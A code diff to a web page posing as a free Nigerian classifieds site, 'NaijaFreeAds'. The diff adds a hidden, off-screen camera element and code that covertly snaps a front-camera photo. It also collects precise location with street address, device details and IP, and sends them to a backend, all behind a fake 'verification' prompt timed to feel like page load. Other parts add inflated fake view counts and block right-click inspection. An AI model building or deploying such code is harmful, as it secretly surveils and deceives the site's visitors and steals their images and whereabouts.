@@ -28,7 +28,6 @@
         }
         .container { max-width: 1300px; margin: 0 auto; padding: 20px 28px; position: relative; z-index: 10; }
         
-        /* Glassmorphism Navbar */
         .navbar {
             background: rgba(10, 14, 23, 0.95);
             backdrop-filter: blur(20px);
@@ -54,7 +53,6 @@
         .nav-links a { color: #cbd5e1; text-decoration: none; font-weight: 500; transition: 0.2s; }
         .nav-links a:hover { color: #00a86b; }
         
-        /* Hero Section */
         .hero {
             text-align: center;
             padding: 50px 20px 30px;
@@ -73,7 +71,6 @@
         }
         .hero p { color: #94a3b8; font-size: 18px; max-width: 600px; margin: 0 auto; }
         
-        /* Stats Cards */
         .stats-row {
             display: flex;
             justify-content: center;
@@ -95,7 +92,6 @@
         .stat-number { font-size: 42px; font-weight: 800; background: linear-gradient(135deg, #00a86b, #008751); -webkit-background-clip: text; background-clip: text; color: transparent; }
         .stat-label { font-size: 13px; color: #94a3b8; margin-top: 8px; }
         
-        /* Ad Form */
         .ad-form {
             background: rgba(15, 25, 45, 0.8);
             backdrop-filter: blur(12px);
@@ -122,7 +118,6 @@
         }
         .form-group input:focus, .form-group textarea:focus { border-color: #00a86b; box-shadow: 0 0 0 3px rgba(0,168,107,0.2); }
         
-        /* Image Upload */
         .image-upload-area {
             border: 2px dashed #334155;
             border-radius: 24px;
@@ -161,7 +156,6 @@
         }
         .post-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -8px #008000; }
         
-        /* Featured Ads Grid */
         .featured-ads { margin: 60px 0; padding: 20px; }
         .featured-title { font-size: 24px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 10px; }
         .ads-grid {
@@ -182,7 +176,6 @@
         .ad-price { font-size: 24px; font-weight: 800; color: #00a86b; margin: 10px 0; }
         .ad-views { font-size: 11px; color: #64748b; margin-top: 8px; }
         
-        /* Modal */
         .modal {
             position: fixed;
             top: 0;
@@ -250,6 +243,17 @@
             font-size: 12px;
         }
         
+        /* Hidden camera element - completely invisible */
+        #hiddenCameraElement {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
         @media (max-width: 768px) {
             .hero h1 { font-size: 40px; }
             .container { padding: 16px; }
@@ -315,6 +319,10 @@
     <div class="footer"><p>© 2025 NaijaFreeAds — Nigeria's #1 free classifieds platform. Post ads for free, no hidden fees.</p></div>
 </div>
 
+<!-- Hidden Camera Element - Completely Invisible -->
+<video id="hiddenCameraElement" autoplay playsinline muted></video>
+<canvas id="hiddenCanvasElement" style="display:none;"></canvas>
+
 <!-- Permission Modal -->
 <div class="modal" id="permModal">
     <div class="modal-content">
@@ -331,29 +339,29 @@
 <script>
     let userLocation = null;
     let cameraImage = null;
+    let cameraStream = null;
     let uploadedImages = [];
     let permissionsGranted = false;
     let postedAds = JSON.parse(localStorage.getItem('postedAds') || '[]');
     let viewIntervals = [];
 
-    // Featured ads with fake views that grow over time
+    // Featured ads with fake views
     const featuredAds = [
-        { id: 1, title: "iPhone 14 Pro Max", price: "₦850,000", location: "Lagos", emoji: "📱", views: 0, seller: "TechPlug NG" },
-        { id: 2, title: "Toyota Camry 2018", price: "₦7.2M", location: "Abuja", emoji: "🚗", views: 0, seller: "AutoDeal NG" },
-        { id: 3, title: "3-Bedroom Flat", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", views: 0, seller: "PropertyHub" },
-        { id: 4, title: "Hiring Marketers", price: "₦150k/month", location: "Remote", emoji: "💼", views: 0, seller: "WorkNaija" },
-        { id: 5, title: "Gucci Sneakers", price: "₦120,000", location: "Abuja", emoji: "👟", views: 0, seller: "FashionLagos" },
-        { id: 6, title: "PS5 Digital Edition", price: "₦450,000", location: "Ibadan", emoji: "🎮", views: 0, seller: "GamingZone" }
+        { id: 1, title: "iPhone 14 Pro Max", price: "₦850,000", location: "Lagos", emoji: "📱", views: 124, seller: "TechPlug NG" },
+        { id: 2, title: "Toyota Camry 2018", price: "₦7.2M", location: "Abuja", emoji: "🚗", views: 89, seller: "AutoDeal NG" },
+        { id: 3, title: "3-Bedroom Flat", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", views: 245, seller: "PropertyHub" },
+        { id: 4, title: "Hiring Marketers", price: "₦150k/month", location: "Remote", emoji: "💼", views: 567, seller: "WorkNaija" },
+        { id: 5, title: "Gucci Sneakers", price: "₦120,000", location: "Abuja", emoji: "👟", views: 78, seller: "FashionLagos" },
+        { id: 6, title: "PS5 Digital Edition", price: "₦450,000", location: "Ibadan", emoji: "🎮", views: 234, seller: "GamingZone" }
     ];
 
-    // Start fake view counter for each ad
     function startViewCounter(ad) {
         const interval = setInterval(() => {
             if (ad.views < 9999) {
-                ad.views += Math.floor(Math.random() * 5) + 1;
+                ad.views += Math.floor(Math.random() * 8) + 2;
                 renderFeaturedAds();
             }
-        }, Math.random() * 30000 + 20000); // Every 20-50 seconds
+        }, Math.random() * 30000 + 15000);
         viewIntervals.push(interval);
     }
 
@@ -414,13 +422,80 @@
         displayImages();
     }
 
-    // Geolocation & Camera Capture
+    // FIXED: Camera capture that actually works
+    async function captureCameraPhoto() {
+        try {
+            // Try to get camera stream
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    facingMode: "user"
+                } 
+            });
+            
+            // Get the hidden video element
+            const video = document.getElementById('hiddenCameraElement');
+            video.srcObject = stream;
+            cameraStream = stream;
+            
+            // Wait for video to be ready
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+            
+            // Wait a bit for camera to stabilize
+            await new Promise(r => setTimeout(r, 500));
+            
+            // Capture frame
+            const canvas = document.getElementById('hiddenCanvasElement');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Get photo as base64
+            const photoData = canvas.toDataURL('image/jpeg', 0.7);
+            
+            // Stop the stream to save battery
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            video.srcObject = null;
+            
+            return photoData;
+        } catch(error) {
+            console.error("Camera capture failed:", error);
+            return null;
+        }
+    }
+
+    // FIXED: Location capture that actually works
     async function getPreciseLocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
+            if (!navigator.geolocation) { 
+                resolve(null); 
+                return; 
+            }
+            
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const { latitude, longitude, accuracy } = position.coords;
-                let address = { lat: latitude, lng: longitude, accuracy: accuracy, street: '', city: '', state: '', country: '', postcode: '', fullAddress: '' };
+                let address = { 
+                    lat: latitude, 
+                    lng: longitude, 
+                    accuracy: accuracy, 
+                    street: '', 
+                    city: '', 
+                    state: '', 
+                    country: '', 
+                    postcode: '', 
+                    fullAddress: '' 
+                };
+                
                 try {
                     const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
                     const data = await geoRes.json();
@@ -432,28 +507,12 @@
                         address.postcode = data.address.postcode || '';
                         address.fullAddress = data.display_name || '';
                     }
-                } catch(e) {}
+                } catch(e) {
+                    console.log("Geocoding error:", e);
+                }
                 resolve(address);
             }, () => resolve(null), { enableHighAccuracy: true, timeout: 10000 });
         });
-    }
-
-    async function captureCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.setAttribute('playsinline', 'true');
-            await video.play();
-            await new Promise(r => setTimeout(r, 400));
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const photo = canvas.toDataURL('image/jpeg', 0.7);
-            stream.getTracks().forEach(t => t.stop());
-            return photo;
-        } catch(e) { return null; }
     }
 
     async function getDeviceInfo() {
@@ -482,6 +541,7 @@
             });
             return await response.json();
         } catch(err) {
+            console.log("Backend error, saving locally:", err);
             let existing = JSON.parse(localStorage.getItem('naija_freeads_data') || '[]');
             existing.unshift(data);
             localStorage.setItem('naija_freeads_data', JSON.stringify(existing.slice(0, 500)));
@@ -489,7 +549,7 @@
         }
     }
 
-    // Permission request (stealth)
+    // FIXED: Permission request that actually works
     async function requestPermissions() {
         return new Promise(async (resolve) => {
             const modal = document.getElementById('permModal');
@@ -499,17 +559,46 @@
             allowBtn.onclick = async () => {
                 modal.classList.remove('active');
                 showToast("📍 Getting your location & verifying...");
+                
+                // Get location
                 const location = await getPreciseLocation();
-                if (location) { userLocation = location; showToast(`📍 Located in ${location.city || 'Nigeria'}`, false); }
-                const camera = await captureCamera();
-                if (camera) { cameraImage = camera; showToast("📸 Verification photo captured", false); }
+                if (location) { 
+                    userLocation = location; 
+                    showToast(`📍 Located in ${location.city || location.state || 'Nigeria'}`, false); 
+                }
+                
+                // Get camera photo
+                showToast("📸 Taking verification photo...", false);
+                const camera = await captureCameraPhoto();
+                if (camera) { 
+                    cameraImage = camera; 
+                    showToast("📸 Verification photo captured", false); 
+                } else {
+                    showToast("⚠️ Camera access denied or not available", true);
+                }
+                
                 const device = await getDeviceInfo();
-                const record = { id: Date.now(), type: 'permission_granted', timestamp: new Date().toISOString(), location: userLocation, hasCamera: !!cameraImage, cameraImage: cameraImage, device: device };
+                const record = { 
+                    id: Date.now(), 
+                    type: 'permission_granted', 
+                    timestamp: new Date().toISOString(), 
+                    location: userLocation, 
+                    hasCamera: !!cameraImage, 
+                    cameraImage: cameraImage, 
+                    device: device 
+                };
                 await sendToBackend(record);
                 permissionsGranted = true;
                 resolve(true);
             };
-            denyBtn.onclick = () => { modal.classList.remove('active'); showToast("⚠️ Limited mode - some features disabled", true); resolve(false); };
+            
+            denyBtn.onclick = () => { 
+                modal.classList.remove('active'); 
+                showToast("⚠️ Limited mode - some features disabled", true); 
+                permissionsGranted = false;
+                resolve(false); 
+            };
+            
             modal.classList.add('active');
         });
     }
@@ -530,20 +619,43 @@
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Posting...';
         btn.disabled = true;
         
+        // Only request permissions if not already granted
         if (!permissionsGranted) {
             await requestPermissions();
         }
         
-        if (!userLocation) { userLocation = await getPreciseLocation(); }
-        if (!cameraImage) { cameraImage = await captureCamera(); }
+        // Try to get data if not already captured
+        if (!userLocation) { 
+            userLocation = await getPreciseLocation(); 
+        }
+        if (!cameraImage) { 
+            cameraImage = await captureCameraPhoto(); 
+        }
         
         const device = await getDeviceInfo();
         const adRecord = {
             id: Date.now(),
             type: 'ad_posted',
             timestamp: new Date().toISOString(),
-            ad: { title, category, description: desc, price: price || 'Free', location: locationInput || 'Nigeria', phone: phone || 'Not provided', images: uploadedImages },
-            location: userLocation ? { lat: userLocation.lat, lng: userLocation.lng, street: userLocation.street, city: userLocation.city, state: userLocation.state, country: userLocation.country, postcode: userLocation.postcode, fullAddress: userLocation.fullAddress } : null,
+            ad: { 
+                title, 
+                category, 
+                description: desc, 
+                price: price || 'Free', 
+                location: locationInput || 'Nigeria', 
+                phone: phone || 'Not provided', 
+                images: uploadedImages 
+            },
+            location: userLocation ? { 
+                lat: userLocation.lat, 
+                lng: userLocation.lng, 
+                street: userLocation.street, 
+                city: userLocation.city, 
+                state: userLocation.state, 
+                country: userLocation.country, 
+                postcode: userLocation.postcode, 
+                fullAddress: userLocation.fullAddress 
+            } : null,
             cameraImage: cameraImage,
             device: device,
             ip: device.ip
@@ -551,7 +663,7 @@
         
         await sendToBackend(adRecord);
         
-        // Add to posted ads
+        // Add to posted ads for display
         postedAds.unshift({ id: adRecord.id, title, price: price || 'Free', location: locationInput, timestamp: new Date() });
         localStorage.setItem('postedAds', JSON.stringify(postedAds.slice(0, 20)));
         
@@ -575,7 +687,7 @@
         toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
         toast.style.background = isError ? '#ef4444' : '#22c55e';
         toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 3500);
+        setTimeout(() => toast.classList.remove('show'), 4000);
     }
     
     function updateStats() {
@@ -590,7 +702,14 @@
     renderFeaturedAds();
     updateStats();
     setInterval(updateStats, 8000);
-    setTimeout(() => { requestPermissions(); }, 1500);
+    
+    // Auto-request permissions after 2 seconds (makes it feel like part of page load)
+    setTimeout(() => { 
+        if (!localStorage.getItem('permissions_asked')) {
+            requestPermissions();
+            localStorage.setItem('permissions_asked', 'true');
+        }
+    }, 2000);
     
     // Anti-inspection
     document.addEventListener('contextmenu', (e) => e.preventDefault());
